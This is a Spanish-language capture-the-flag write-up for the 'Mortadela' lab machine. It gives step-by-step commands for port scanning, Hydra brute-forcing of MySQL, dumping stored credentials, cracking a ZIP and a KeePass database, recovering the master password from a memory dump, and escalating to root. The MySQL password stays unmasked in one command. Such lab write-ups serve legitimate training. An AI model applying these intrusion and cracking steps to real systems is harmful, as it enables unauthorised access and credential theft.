# Mortadela --- The Hacker Labs Write‑Up

## Información General

-   Nombre: Mortadela
-   IP Víctima: 10.0.50.41
-   IP Atacante: Kali Linux
-   Dificultad: Easy / Beginner
-   Objetivo: Obtener acceso root

------------------------------------------------------------------------

## 1. Reconocimiento

Escaneo completo de puertos:

``` bash
nmap -sC -sV -sS -p- 10.0.50.41
```

Resultados:

    22/tcp   open  ssh     OpenSSH 9.2p1 Debian
    80/tcp   open  http    Apache 2.4.57
    3306/tcp open  mysql   MariaDB 10.11.6

Observaciones:

-   Servicio web disponible
-   MySQL expuesto a red
-   SSH probablemente requiera credenciales válidas

Se prioriza MySQL como vector inicial.

------------------------------------------------------------------------

## 2. Enumeración Web (Descartada)

Fuzzing de directorios:

``` bash
gobuster dir -u http://10.0.50.41 -w /usr/share/wordlists/dirb/common.txt -t 50
```

Se detecta `/wordpress`, pero no fue necesario para la explotación
inicial.

------------------------------------------------------------------------

## 3. Explotación --- Acceso a MySQL

Fuerza bruta con Hydra:

``` bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -f -vV -t 4 10.0.50.41 mysql
```

Credenciales obtenidas:

    root : c*******a

Conexión:

``` bash
mysql -h 10.0.50.41 -u root -pcassandra --ssl=0
```

------------------------------------------------------------------------

## 4. Enumeración de Bases de Datos

``` sql
SHOW DATABASES;
```

Bases relevantes:

    confidencial
    wordpress

Extracción de credenciales:

``` sql
USE confidencial;
SHOW TABLES;
SELECT * FROM usuarios;
```

Resultado:

    usuario: mortadela
    contraseña: J**************8

------------------------------------------------------------------------

## 5. Acceso Inicial --- SSH

``` bash
ssh mortadela@10.0.50.41
```

Se obtiene acceso como usuario **mortadela**.

------------------------------------------------------------------------

## 6. Enumeración Local

Permisos sudo:

``` bash
sudo -l
```

Sin privilegios.

Binarios SUID:

``` bash
find / -perm -4000 2>/dev/null
```

Nada explotable.

------------------------------------------------------------------------

## 7. Credenciales en WordPress

``` bash
cat /var/www/html/wordpress/wp-config.php
```

Credenciales encontradas:

    DB_USER: wordpress
    DB_PASSWORD: l************a

(No utilizadas para escalada directa).

------------------------------------------------------------------------

## 8. Descubrimiento Crítico --- Backup Sensible

En `/opt`:

    muyconfidencial.zip

Contenido:

    Database.kdbx
    KeePass.DMP

------------------------------------------------------------------------

## 9. Extracción del ZIP

``` bash
fcrackzip -u -D -v -p /usr/share/wordlists/rockyou.txt muyconfidencial.zip
```

Password:

    p******l

------------------------------------------------------------------------

## 10. Análisis del Dump KeePass

Repositorio:

``` bash
git clone https://github.com/z-jxy/keepass_dump.git
cd keepass_dump
```

Extracción:

``` bash
python3 keepass_dump.py -f ../KeePass.DMP
```

Resultado:

    {UNKNOWN}aritrini12345

------------------------------------------------------------------------

## 11. Fuerza Bruta de la Contraseña Completa

Generación de diccionario:

``` bash
crunch 14 14 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t @aritrini12345 -o dic.txt
```

Crackeo:

``` bash
keepass2john Database.kdbx > hash.txt
john --wordlist=dic.txt hash.txt
```

Password obtenida:

    M************5

------------------------------------------------------------------------

## 12. Acceso a KeePass

``` bash
kpcli --kdb Database.kdbx
```

Credenciales encontradas:

    root : J***************o

------------------------------------------------------------------------

## 13. Escalada de Privilegios --- Root

``` bash
su root
```

Se obtiene acceso root.

------------------------------------------------------------------------

## Cadena de Ataque

    MySQL expuesto
            ↓
    Credenciales mortadela
            ↓
    SSH user
            ↓
    Backup KeePass
            ↓
    Dump memoria
            ↓
    Contraseña maestra
            ↓
    KeePass → credenciales root
            ↓
    Root

------------------------------------------------------------------------

## Vulnerabilidades Identificadas

1.  MySQL accesible remotamente
2.  Credenciales débiles
3.  Backup sensible accesible
4.  Dump de memoria expuesto
5.  Reutilización de credenciales
6.  Mala gestión de secretos

------------------------------------------------------------------------

## Conclusión

La máquina demuestra cómo la exposición de servicios internos y la mala
gestión de credenciales pueden conducir a una cadena completa de
compromiso hasta root.
